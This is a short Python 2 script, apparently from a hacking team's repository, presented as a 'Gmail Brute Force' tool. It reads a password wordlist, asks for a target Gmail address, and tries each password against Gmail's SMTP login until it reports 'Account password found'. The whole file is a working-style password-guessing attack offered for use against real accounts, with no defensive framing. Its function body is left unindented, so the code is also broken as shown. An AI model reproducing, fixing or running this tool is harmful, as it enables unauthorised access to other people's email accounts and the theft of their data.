#!/usr/bin/python
'''Creator : Anon6372098'''

import smtplib
import sys
import os
from os import system

def main():
os.system("clear")
os.system("figlet Gmail Brute Force DSFS")
print
print "Creator   : Anon6372098"
print "You Tube  : https://www.youtube.com/channel/UC6z-i5NX934RvX7BWr3MlJw (D4RK SYST3M F41LUR3 S33K3R)"
print "Github    : https://github.com/Anon6372098"
print "Email     : anon6372098@gmail.com"
print "Team.     : D4RK SYST3M F41LUR3 S33K3R (DSFS)"
print
main()
print '[1] Start an Attack '
print '[2] Exit'
option = input('Choose/Pilih: >')
if option == 1:
   file_path = raw_input('Path of the .txt file of your wordlist :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('Target E-mail (@gmail.com) :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Account password found :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Account password found :' + password + '     ^_^'

            break
         else:
            print '[!]  Password search...  => ' + password
login()
